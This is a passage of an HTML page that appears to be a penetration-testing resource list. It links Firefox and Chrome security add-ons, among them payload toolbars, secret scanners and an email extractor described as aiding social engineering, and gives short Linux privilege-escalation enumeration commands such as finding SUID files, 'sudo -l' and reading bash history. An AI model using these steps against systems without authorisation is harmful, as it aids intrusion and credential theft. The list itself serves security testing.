				<li><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'> Hash Identifier </a>. Python file. Powerful. User friendly interface.
			</ul>
		</ol>


			
<h3 align='right'><a href='#start'> <-- Back </a></h3>


 <h2 align='center' id='n5'><em> Browser add-ons </em></h2>
 <h3> Mozilla FireFox </h3>
	<ul>
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/beautifer-minify/'> Beautifer & Minify </a> - Brings readable CSS, HTML and JavaScript code
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/builtwith/'> BuiltWith </a> - Get web app technologies
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/'> Cookie Editor </a> - Allows you to change, delete, add cookie values for various testing purposes. Can be tested for access control errors, privilege escalation, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/dotgit/'> DotGit </a> - An extension to check for the presence of .git on websites you visit. Also checks open .env files, security.txt and more
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/mailshunt-email-extractor/'> Email Extractor </a> - Automatically saves email addresses from the web pages visit. Helps with social engineering attacks, brute force attacks, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/exif-viewer/'> Exif-Viewer </a> - Help to check photo metadata
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/fake-filler/'> Fake Filler </a> - Simplifies and speeds up testing of fillable forms by developers and testers. Helps to populate all input forms (text fields, areas, dropdowns, etc.) with fake and randomly generated data
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/'> Foxy Proxy </a> - Fast change proxy, for example, use with Burp Suite
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/'> Hackbar </a> - Contains payloads for XSS attacks, SQL injections, WAF bypass, LFI, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/knoxss-community-edition/'> Knoxss </a> -
			Finds XSS vulnerabilities. Community Edition and Pro Version
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/'> ModHeader </a> - Helps to easily change HTTP request and response headers in the browser
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/nimbus-screenshot/'> Nimbus Screenshot </a> - To make screenshot
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/privacy-badger17/'> Privicy Badger  </a> - Automatically learns to block invisible trackers
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/retire-js/'> Retire.js </a> - Displays the presence of vulnerable JavaScript libraries. This helps to find known vulnerabilities in JS and some CVEs affecting sites with vulnerable JS libraries
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/'> Shodan </a> - The Shodan plugin tells you where the website is hosted (country, city), who owns the IP and what other services/ ports are open
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search'> Ublock Origin </a> - An efficient wide-spectrum content blocker
		<li><a href='https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/'> User-Agent </a> Swither
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/'> Wappalyzer </a> - Defines CMS, JS-libraries, frameworks and another technologies used on the site
	</ul>
 <h3> Google Chrome </h3>
	<ul>
		<li> <a href='https://chrome.google.com/webstore/detail/beautifer-minify/ahhjkfcneijonkihlcplndcnlpofjaip?hl=en'> Beautifer & Minify </a>
		<li> <a href='https://chrome.google.com/webstore/detail/builtwith-technology-prof/dapjbgnjinbpoindlpdmhochffioedbn?hl=en'> BuiltWith </a>
		<li> <a href='https://chrome.google.com/webstore/detail/chaff/jgjhamliocfhehbocekgcddfjpgdjnje'> Chaff </a> - Generate fake traffic
		<li> <a href='https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en'> Cookie-Editor </a>
		<li> <a href='https://chrome.google.com/webstore/detail/dotgit/pampamgoihgcedonnphgehgondkhikel?hl=en'> DotGit </a>
		<li> <a href='https://chrome.google.com/webstore/detail/email-extractor/jdianbbpnakhcmfkcckaboohfgnngfcc?hl=en'> Email Extractor </a>
		<li> <a href='https://chrome.google.com/webstore/detail/exif-viewer-pro/mmbhfeiddhndihdjeganjggkmjapkffm'> Exif-Viewer </a>
		<li> <a href='https://chrome.google.com/webstore/detail/fake-filler/bnjjngeaknajbdcgpfkgnonkmififhfo?hl=en'> Fake Filler </a>
		<li> <a href='https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en'> Foxy Proxy </a>
		<li> <a href='https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?hl=en'> HackBar </a>
		<li> <a href='https://chrome.google.com/webstore/detail/modheader-modify-http-hea/idgpnmonknjnojddfkpgkljpfnnfcklj?hl=en'> ModHeader </a>
		<li> <a href='https://chrome.google.com/webstore/detail/nimbus-screenshot-screen/bpconcjcammlapcogcnnelfmaeghhagj'> Nimbus Screenshot </a>
		<li> <a href='https://chrome.google.com/webstore/detail/privacy-badger/pkehgijcmpdhfbdbbnkijodmdjhbjlgp?hl=en'> Privacy Badger </a>
		<li> <a href='https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?hl=en'> Retire.js </a>
		<li> <a href='https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap'> Shodan </a>
		<li> <a href='https://chrome.google.com/webstore/detail/trufflehog/bafhdnhjnlcdbjcdcnafhdcphhnfnhjc'> TruffleHog Chrome Extension </a> - Scans the websites you visit looking for API keys and credentials and notifies you if they are found
		<li> <a href='https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en'> uBlock Origin </a>
		<li> <a href='https://chrome.google.com/webstore/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg'> User-Agent Switcher </a>
		<li> <a href='https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en'> Wappalyzer </a>
  	</ul>
   
<h3 align='right'><a href='#start'> <-- Back </a></h3>

<h2 align='center' id='n6'><em> Privilege Escalation </em></h2>
<h3> ENUMERATION is a key! </h3>
	 <h3> <ins>Linux</ins> </h3>
  		Some advice to Linux Privilege Escalation
    		<ul>
			<li> Check kernel ( <code>uname -a</code> ) and OS version ( <code>cat /etc/os-release</code> )
			<li> Check screen version ( <code>screen -v</code> )
			<li> Check Cron Tab
			<li> Check setuid and setgid 
				<p> To find files with sticky bit:
					<pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
				<p> To check rights
				<p> <pre><code>ls -la</code></pre>
			<li> Check NOPASSWD sudo command ( <code>sudo -l</code> ) and use this command(s)
			<li> Check PATH ( <code>echo $PATH</code> )
			<li> Check commands history <code>cat ~/.bash_history</code>
    		</ul>
       <h3><ins> Windows </ins></h3>
       		Information about the target system:
		<pre><code>systeminfo</code></pre>
       
      
<h3 align='right'><a href='#start'> <-- Back </a></h3>        

</body>
